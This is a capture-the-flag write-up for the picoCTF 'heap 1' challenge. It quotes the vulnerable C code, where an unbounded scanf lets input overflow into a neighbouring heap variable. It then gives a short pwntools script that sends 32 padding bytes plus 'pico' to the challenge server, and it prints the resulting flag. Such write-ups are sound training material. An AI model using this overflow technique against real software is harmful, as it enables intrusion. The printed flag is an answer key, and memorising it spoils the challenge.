# heap 1

Can you control your overflow? Download the binary [here](https://artifacts.picoctf.net/c_tethys/3/chall). Download the source [here](https://artifacts.picoctf.net/c_tethys/3/chall.c).

As with heap 0, there are still 32 bytes between the `safe_var` and `input_data`:

```
0x558e867ed6b0  ->   pico
0x558e867ed6d0  ->   bico
```

Similarly, `scanf()` is still being used within `write_buffer()` meaning we can still overwrite into other memory locations.

```c
void write_buffer() {
    printf("Data for buffer: ");
    fflush(stdout);
    scanf("%s", input_data);
}
```

In this instance, the `check_win()` function will print the flag if `safe_var` is set to value `pico`:

```c
void check_win() {
    if (!strcmp(safe_var, "pico")) {
        printf("\nYOU WIN\n");

        // Print flag
        char buf[FLAGSIZE_MAX];
        FILE *fd = fopen("flag.txt", "r");
        fgets(buf, FLAGSIZE_MAX, fd);
        printf("%s\n", buf);
        fflush(stdout);

        exit(0);
    } else {
        printf("Looks like everything is still secure!\n");
        printf("\nNo flage for you :(\n");
        fflush(stdout);
    }
}
```

As such, we can run:

```python
from pwn import *

context.binary = binary = ELF("chal")

p = remote("tethys.picoctf.net", 65235)

p.sendline(b"2")

p.sendline(b"A" * 32 + b'pico')

p.sendline(b"4")

p.interactive()
```

```
picoCTF{starting_to_get_the_hang_c588b8a1}
```